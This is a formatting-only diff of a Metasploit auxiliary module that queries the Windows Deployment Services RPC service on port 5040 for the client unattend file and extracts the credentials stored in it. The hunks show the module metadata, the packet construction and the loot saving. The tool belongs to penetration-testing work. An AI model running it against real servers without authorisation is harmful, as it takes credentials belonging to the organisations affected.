@@ -3,46 +3,49 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DCERPC
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  DCERPCPacket   	= Rex::Proto::DCERPC::Packet
-  DCERPCClient   	= Rex::Proto::DCERPC::Client
-  DCERPCResponse 	= Rex::Proto::DCERPC::Response
-  DCERPCUUID     	= Rex::Proto::DCERPC::UUID
-  WDS_CONST 		  = Rex::Proto::DCERPC::WDSCP::Constants
+  DCERPCPacket	= Rex::Proto::DCERPC::Packet
+  DCERPCClient	= Rex::Proto::DCERPC::Client
+  DCERPCResponse	= Rex::Proto::DCERPC::Response
+  DCERPCUUID	= Rex::Proto::DCERPC::UUID
+  WDS_CONST = Rex::Proto::DCERPC::WDSCP::Constants
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Windows Deployment Services Unattend Retrieval',
-      'Description'    => %q{
-        This module retrieves the client unattend file from Windows
-        Deployment Services RPC service and parses out the stored credentials.
-        Tested against Windows 2008 R2 x64 and Windows 2003 x86.
-      },
-      'Author'         => [ 'Ben Campbell' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows Deployment Services Unattend Retrieval',
+        'Description' => %q{
+          This module retrieves the client unattend file from Windows
+          Deployment Services RPC service and parses out the stored credentials.
+          Tested against Windows 2008 R2 x64 and Windows 2003 x86.
+        },
+        'Author' => [ 'Ben Campbell' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
           [ 'URL', 'http://rewtdance.blogspot.co.uk/2012/11/windows-deployment-services-clear-text.html']
         ],
-      ))
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(5040),
-      ])
+      ]
+    )
 
     deregister_options('CHOST', 'CPORT', 'SSL', 'SSLVersion')
 
     register_advanced_options(
       [
         OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not currently supported by Windows and will cause an error in System Event Log)', false])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -141,18 +144,18 @@ class MetasploitModule < Msf::Auxiliary
     packet = Rex::Proto::DCERPC::WDSCP::Packet.new(:REQUEST, :GET_CLIENT_UNATTEND)
 
     guid = Rex::Text.rand_text_hex(32)
-    packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_GUID, guid)
+    packet.add_var(WDS_CONST::VAR_NAME_CLIENT_GUID, guid)
 
     # Not sure what this padding is for...
     mac = [0x30].pack('C') * 20
     mac << Rex::Text.rand_text_hex(12)
-    packet.add_var(	WDS_CONST::VAR_NAME_CLIENT_MAC, mac)
+    packet.add_var(WDS_CONST::VAR_NAME_CLIENT_MAC, mac)
 
     arch = [architecture[1]].pack('C')
-    packet.add_var(	WDS_CONST::VAR_NAME_ARCHITECTURE, arch)
+    packet.add_var(WDS_CONST::VAR_NAME_ARCHITECTURE, arch)
 
     version = [1].pack('V')
-    packet.add_var(	WDS_CONST::VAR_NAME_VERSION, version)
+    packet.add_var(WDS_CONST::VAR_NAME_VERSION, version)
 
     wdsc_packet = packet.create
 
@@ -202,11 +205,12 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Invalid XML format")
       vprint_line(e.message)
       return nil
-     end
+    end
   end
 
   def loot_unattend(archi, data)
     return if data.empty?
+
     p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
     print_good("Raw version of #{archi} saved as: #{p}")
   end
